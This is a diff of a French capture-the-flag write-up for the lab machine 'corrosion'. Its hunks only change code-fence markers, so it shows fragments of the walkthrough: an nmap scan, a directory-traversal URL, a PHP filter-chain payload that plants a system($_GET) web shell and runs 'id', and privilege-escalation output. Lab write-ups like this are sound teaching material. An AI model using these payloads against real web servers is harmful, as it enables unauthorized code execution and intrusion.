@@ -12,7 +12,7 @@ Le cheminement attendu de l'attaque est des plus classique avec une injection de
 
 Allez, c'est parti !  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.38
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 17:06 CEST
 Nmap scan report for 192.168.56.38
@@ -51,7 +51,7 @@ Tous ces messages subliminaux autour des logs semblent insister sur la possibili
 
 Je tente de lui passer différents noms de paramètres bien connus et au second j'obtiens bien un directory traversal avec l'URL suivante :  
 
-```plain
+```
 http://192.168.56.38/blog-post/archives/randylogs.php?file=/un/path/quelconque
 ```
 
@@ -74,7 +74,7 @@ Au final en alignant des conversions d'encodage partant de nul part on peut gén
 
 L'exemple pris dans le document original c'est la conversion UTF-8 vers [ISO-2022-KR](https://en.wikipedia.org/wiki/ISO/IEC_2022), un vieil encodage créé en 1993. Ce dernier place un entête constitué des caractères suivants :  
 
-```plain
+```
 \x1b$)C
 ```
 
@@ -90,7 +90,7 @@ python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 
 Et l'intégrer dans l'URL qui ressemblera à ceci :  
 
-```plain
+```
 http://192.168.56.38/blog-post/archives/randylogs.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|--- snip ---|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&c=id
 ```
 
@@ -105,7 +105,7 @@ Je m'intéresse aussitôt à l'utilisateur *randy*, seul rempart visible avant *
 
 Dans les logs je retrouve effectivement le auth.log qui était lisible mais dont je n'ai pas eu besoin   
 
-```plain
+```
 www-data@corrosion:/home$ find /var/log/ -type f -readable 2>/dev/null 
 /var/log/alternatives.log
 /var/log/wtmp
@@ -131,7 +131,7 @@ Les processus, les ports en écoute ou encore les binaires setuid n'ont rien qui
 
 Ce dernier indique que le système est potentiellement vulnérable à la faille Sudo Baron Samedit (devenue un running gag des CTFs) mais surtout retrouve une archive intéressante dans */var/backups/* :  
 
-```plain
+```
 www-data@corrosion:/tmp$ unzip -l /var/backups/user_backup.zip
 Archive:  /var/backups/user_backup.zip
   Length      Date    Time    Name
@@ -151,7 +151,7 @@ Musique classique
 
 L'accès permet la récupération du premier flag (98342721012390839081). Là on remarque que l'on peut exécuter un binaire avec les droits de l'utilisateur root :  
 
-```plain
+```
 randy@corrosion:~$ sudo -l
 [sudo] password for randy: 
 Matching Defaults entries for randy on corrosion:
@@ -202,7 +202,7 @@ Twitter: https://twitter.com/proxyprgrammer
 
 Dans la crontab de root on peut faire l'entrée qui fixait les permissions laxistes sur le fichier de log :  
 
-```plain
+```
 root@corrosion:/root# crontab -l
 # m h  dom mon dow   command
 
